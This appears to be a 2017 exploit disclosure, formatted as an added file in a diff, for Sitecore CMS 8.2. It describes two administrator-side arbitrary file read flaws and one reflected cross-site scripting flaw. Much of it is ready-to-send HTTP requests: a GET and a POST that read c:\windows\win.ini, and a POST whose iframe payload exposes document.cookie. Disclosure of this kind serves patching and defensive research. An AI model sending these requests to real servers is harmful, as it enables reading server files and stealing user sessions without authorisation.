@@ -1,0 +1,78 @@
+Exploit title: Sitecore CMS v8.2  multiple vulnerabilities
+Product: Sitecore
+Version: 8.2, Rev: 161221, Date: 21st December, 2016
+Date: 05-05-2017
+Author: Usman Saeed
+Email: usman@xc0re.net <%20usman@xc0re.net>
+Vendor Homepage: http://www.sitecore.net/
+
+
+Disclaimer: Everything mentioned below is for educational puposes. The
+vulnerability details are mentioned as is. I would not be held responsible
+for any misuse of this information.
+
+Summary:
+Multiple vulnerabilities were found in the Sitecore product.  The
+vulnerabilities include two instances of arbitrary file access and once
+instance of reflected cosssite scripting.
+
+1: Arbitrary file access:
+
+- Description:
+
+The vulnerability lies in the tools which can be accessed via the
+administrator user. The vulnerability exists because there is no bound
+check for absolute path in the application, that is, if the absolute path
+is provided to the vulnerable URL, it reads the path and shows the contents
+of the file requested.
+
+- Exploit:
+1. Once authenticated as the administrator perform a GET request to the
+followiung URL:
+/sitecore/shell/Applications/Layouts/IDE.aspx?fi=c:\windows\win.ini
+
+2. Once authenticated as the administrator perform a POST request to the
+followiung URL:
+
+POST /sitecore/admin/LinqScratchPad.aspx
+HTTP/1.1
+Host: <HOST>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101
+ Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1463
+Referer: <OMITTED>
+Cookie: <OMITTED>
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+__VIEWSTATE= &__VIEWSTATEGENERATOR=
+&__EVENTVALIDATION=&LinqQuery=%0D%0A&Reference=c%3A%5Cwindows%
+5Cwin.ini&Fetch=
+
+
+
+2. Reflected Cross-site Scripting:
+- Description:
+The application does not sanatize the USER input which allows a normal
+authenticated user to exploit this vulnerability.
+
+
+- Exploit:
+
+POST /sitecore/shell/Applications/Tools/Run HTTP/1.1
+Host: <HOST>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101
+ Firefox/53.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Referer:  <OMITTED>
+Content-Length: 518
+Cookie:  <OMITTED>
+
+&__PARAMETERS=run%3Aok&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=1763&__Y=883&__URL=https%3A///sitecore/shell/Applications/Tools/Run&__CSRFTOKEN=
+&__VIEWSTATE=&__VIEWSTATE=&Program=%3F%3E%3C%3F%3E%3Ciframe%20src%3D%22Javascript%3Aalert(
+document.cookie)%3B%22%3E%3C%2Fiframe%3E
